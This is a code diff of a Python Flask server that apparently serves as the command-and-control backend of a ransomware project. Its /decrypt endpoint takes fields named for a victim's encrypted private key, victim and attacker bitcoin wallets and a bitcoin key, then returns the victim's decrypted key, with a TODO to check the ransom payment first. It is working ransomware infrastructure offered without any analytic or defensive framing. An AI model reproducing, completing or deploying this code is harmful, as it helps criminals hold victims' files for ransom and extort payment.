@@ -3,6 +3,7 @@ from base64 import b64decode, b64encode
 from cryptography.hazmat.primitives.asymmetric import rsa, padding as asymmetric_padding
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.backends import default_backend
+from asymmetric_encryption import RSA
 import logging
 
 logging.basicConfig(
@@ -12,56 +13,7 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-RSA_KEY_SIZE_IN_BITS = 2048
-RSA_PUBLIC_EXPONENT = 65537
-MASTER_PRIVATE_KEY = open(
-    "/Users/surya/Desktop/Druid/c_and_c_server/MASTER_PRIVATE_KEY", "rb"
-).read()
-
-
-class RSA:
-    def __init__(self):
-        self._backend = default_backend()
-        self._private_key = self._load_private_key_from_byte_string(MASTER_PRIVATE_KEY)
-        self._public_key = self._private_key.public_key()
-
-    def _get_padding(self):
-
-        padder = asymmetric_padding.OAEP(
-            mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None,
-        )
-        return padder
-
-    def decrypt_data(self, encrypted_data):
-        unencrypted_data = self._private_key.decrypt(
-            encrypted_data, self._get_padding()
-        )
-        return unencrypted_data
-
-    def _load_private_key_from_byte_string(self, private_key):
-        serialized_private_key = serialization.load_pem_private_key(
-            data=private_key, password=None, backend=self._backend
-        )
-        return serialized_private_key
-
-    @property
-    def private_key(self):
-        serialized_private_key = self._private_key.private_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PrivateFormat.TraditionalOpenSSL,
-            encryption_algorithm=serialization.NoEncryption(),
-        )
-        return serialized_private_key
-
-    @property
-    def public_key(self):
-        serialized_public_key = self._public_key.public_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PublicFormat.SubjectPublicKeyInfo,
-        )
-        return serialized_public_key
+# TODO: Check match between bitcoin private key and wallet_address
 
 
 def decrypt_rsa_key(encrypted_key):
@@ -71,20 +23,38 @@ def decrypt_rsa_key(encrypted_key):
         [cipher.decrypt_data(key_part) for key_part in encrypted_key]
     )
     payload = {"key": b64encode(unencrypted_local_private_key).decode("ascii")}
+    logger.info(f"Returning Payload: {payload}")
     return payload
+
+def check_parameters(request_parameters):
+    all_request_parameters = [
+        "victim_private_key",
+        "my_bitcoin_private_key",
+        "my_wallet_id",
+        "victim_wallet_id",
+    ]
+
+    if list(request_parameters.keys()) == all_request_parameters:
+        return True
+    return False
+
+def unpack_request(request_parameters):
+    victim_private_key = [b64decode(part) for part in request_parameters.get("victim_private_key")]
+    my_bitcoin_private_key = [b64decode(part) for part in request_parameters.get("my_bitcoin_private_key")]
+    my_wallet_id = b64decode(request_parameters.get("my_wallet_id")).decode()
+    victim_wallet_id = b64decode(request_parameters.get("victim_wallet_id")).decode()
+    return victim_private_key, my_bitcoin_private_key, my_wallet_id, victim_wallet_id
 
 
 @app.route("/decrypt", methods=["POST"])
-def hello_world():
-    request_data = request.get_json()
-    if request_data.get("payload"):
-        return decrypt_rsa_key(
-            [b64decode(part) for part in request_data.get("payload")]
-        )
+def process():
+    request_parameters = request.get_json()
+    logger.info(request_parameters)
+    if check_parameters(request_parameters):
+        victim_private_key, my_bitcoin_private_key, my_wallet_id, victim_wallet_id = unpack_request(request_parameters)
+        return decrypt_rsa_key(victim_private_key)
     else:
-        return {
-            "message": "He killed three men in a bar with a pencil, WITH A F'KIN PENCIL"
-        }
+        return {"message": "He killed three men in a bar with a pencil, WITH A F'KIN PENCIL"}
 
 
 if __name__ == "__main__":
